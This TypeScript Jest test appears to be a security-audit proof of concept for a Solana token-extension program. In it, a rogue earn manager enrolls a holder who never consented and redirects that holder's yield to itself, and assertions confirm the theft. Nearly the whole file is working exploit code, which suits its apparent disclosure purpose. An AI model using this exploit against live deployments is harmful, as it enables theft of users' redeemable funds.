// ============================================================================
// PoC: m_ext "crank" variant — `add_earner` requires NO consent from the user,
// and `set_recipient` lets the earn manager redirect the payout to any account.
//
// A single admin-approved (but rogue / key-compromised) earn manager can:
//   1. enroll an ARBITRARY, non-consenting M-extension holder as its earner
//      (add_earner is signed only by the manager — the `user` never signs), then
//   2. redirect that earner's yield to an account the attacker controls
//      (set_recipient's recipient account owner is unchecked).
// The honest earn_authority crank then mints the victim's yield — real,
// 1:1-M-redeemable ext tokens — straight to the attacker. The victim has no
// on-chain recourse (cannot self-remove; cannot out-set_recipient the manager).
//
// HARM ASSERTION (not a mechanism test):
//   attacker's ext balance increases by the victim's full per-cycle yield, while
//   the victim's balance is unchanged. => theft of redeemable funds.
//
// Run: pnpm jest tests/unit/poc_earner_consent.test.ts
// ============================================================================

import { BN } from "@coral-xyz/anchor";
import { Keypair, LAMPORTS_PER_SOL } from "@solana/web3.js";
import { TOKEN_2022_PROGRAM_ID } from "@solana/spl-token";

import { ExtensionTest, Variant } from "./ext_test_harness";

const initialSupply = new BN(100_000_000); // 100 M (6 decimals)
const initialIndex = new BN(1_100_000_000_000); // 1.1 (12-decimal index)
const newIndex = new BN(1_200_000_000_000); // 1.2  -> creates yield to distribute
const ONE = new BN(1_000_000_000_000); // 1.0
const mintAmount = new BN(100_000_000); // 100 ext held by the victim

describe("POC: add_earner missing consent -> earn manager steals a non-consenting holder's yield (crank)", () => {
  let $: ExtensionTest<Variant.Crank>;

  // The attacker is an admin-approved earn manager that has gone rogue
  // (or whose key was phished / supply-chain-compromised).
  const attackerManager = new Keypair();
  // The victim is an ordinary M-extension holder who NEVER opts into earning.
  const victim = new Keypair();
  // An unrelated holder that just provides vault collateral buffer (so the
  // claim_for solvency check is not knife-edge); never enrolled, never attacked.
  const collateralHolder = new Keypair();

  beforeEach(async () => {
    $ = new ExtensionTest(Variant.Crank, TOKEN_2022_PROGRAM_ID, []);
    await $.init(initialSupply, initialIndex);

    for (const acct of [attackerManager, victim, collateralHolder]) {
      $.svm.airdrop(acct.publicKey, BigInt(10 * LAMPORTS_PER_SOL));
    }

    // Deploy the crank extension.
    await $.initializeExt([$.admin.publicKey, $.wrapAuthority.publicKey], undefined);

    // Admin onboards the earn manager (semi-trusted partner). Fee 0 — the theft
    // here uses recipient redirection, NOT the fee, so no special fee config.
    await $.addEarnManager(attackerManager.publicKey, new BN(0));

    // The victim independently acquires ext tokens the normal way and stays a
    // plain holder: become an M earner, receive M, then wrap M -> ext.
    // The collateral holder does the same (just to fund vault excess collateral).
    for (const holder of [victim, collateralHolder]) {
      await $.addMEarner(holder.publicKey);
      await $.mintM(holder.publicKey, mintAmount);
    }
    // Re-propagate so the earn program's tracked supply covers the freshly
    // minted M (mirrors a bridge tx; same step the repo's own crank tests use).
    await $.propagateIndex(initialIndex);
    await $.wrap(victim, mintAmount, $.wrapAuthority);
    await $.wrap(collateralHolder, mintAmount, $.wrapAuthority);

    // Time passes and M appreciates -> there is now real yield to distribute.
    $.warp(new BN(3600), true);
    await $.propagateIndex(newIndex);
  });

  test("rogue earn manager enrolls a non-consenting holder and steals their yield", async () => {
    const victimATA = await $.getATA($.extMint.publicKey, victim.publicKey, $.useToken2022ForExt);
    const attackerATA = await $.getATA(
      $.extMint.publicKey,
      attackerManager.publicKey,
      $.useToken2022ForExt,
    );

    const victimBalBefore = await $.getTokenBalance(victimATA, $.useToken2022ForExt);
    const attackerBalBefore = await $.getTokenBalance(attackerATA, $.useToken2022ForExt);
    expect(victimBalBefore.gt(new BN(0))).toBe(true); // victim holds real ext

    // ===================================================================
    // ATTACK STEP 1 — non-consensual enrollment.
    // Only `attackerManager` signs. `victim` does NOT sign anything.
    // ===================================================================
    await $.addEarner(attackerManager, victim.publicKey);

    const earnerAccount = $.getEarnerAccount(victimATA);
    const earner = await $.ext.account.earner.fetch(earnerAccount);
    // Proof the victim was enrolled without consent, bound to the attacker.
    expect(earner.earnManager.toBase58()).toEqual(attackerManager.publicKey.toBase58());
    expect(earner.user.toBase58()).toEqual(victim.publicKey.toBase58());
    const lastClaimIndex = earner.lastClaimIndex as BN;

    // ===================================================================
    // ATTACK STEP 2 — redirect the victim's yield to the attacker.
    // setRecipient accepts the earn manager as signer and does NOT check the
    // recipient account's owner (only token::mint = ext_mint).
    // ===================================================================
    await $.setRecipient(attackerManager, earnerAccount, attackerATA);
    const earnerAfter = await $.ext.account.earner.fetch(earnerAccount);
    expect(earnerAfter.recipientTokenAccount?.toBase58()).toEqual(attackerATA.toBase58());

    // ===================================================================
    // STEP 3 — the HONEST earn_authority crank runs its normal cycle.
    // (sync the index, then claim_for the discovered earner.) The crank has no
    // way to know this earner is malicious; it dutifully mints the yield.
    // ===================================================================
    await $.sync();
    const newExtIndex = await $.getCurrentExtIndex();

    // rewards = snapshot * (last_ext_index / last_claim_index) - snapshot
    const expectedStolen = victimBalBefore
      .mul(newExtIndex)
      .div(lastClaimIndex)
      .sub(victimBalBefore);
    expect(expectedStolen.gt(new BN(0))).toBe(true);

    // Honest earn_authority signs; rewards are minted to the redirected recipient
    // (the attacker's account). userTokenAccount must equal the earner's recipient.
    await $.ext.methods
      .claimFor(victimBalBefore)
      .accountsPartial({
        earnAuthority: $.earnAuthority.publicKey,
        earnerAccount,
        earnManagerAccount: $.getEarnManagerAccount(attackerManager.publicKey),
        userTokenAccount: attackerATA, // redirected recipient
        earnManagerTokenAccount: attackerATA, // fee acct (fee = 0, unused)
        extTokenProgram: $.extTokenProgram,
      })
      .signers([$.earnAuthority])
      .rpc();

    // ===================================================================
    // HARM ASSERTIONS
    // ===================================================================
    const victimBalAfter = await $.getTokenBalance(victimATA, $.useToken2022ForExt);
    const attackerBalAfter = await $.getTokenBalance(attackerATA, $.useToken2022ForExt);

    const stolen = attackerBalAfter.sub(attackerBalBefore);

    // The attacker received the victim's entire yield as real, redeemable ext.
    expect(stolen.toString()).toEqual(expectedStolen.toString());
    expect(stolen.gt(new BN(0))).toBe(true);
    // The victim received NONE of their own yield.
    expect(victimBalAfter.toString()).toEqual(victimBalBefore.toString());

    // eslint-disable-next-line no-console
    console.log(
      `\n[PoC CONFIRMED] non-consenting victim balance unchanged: ${victimBalAfter.toString()}` +
        `\n[PoC CONFIRMED] attacker stole victim yield (redeemable ext): ${stolen.toString()}` +
        `\n   lastClaimIndex=${lastClaimIndex.toString()} newExtIndex=${newExtIndex.toString()}`,
    );
  });
});
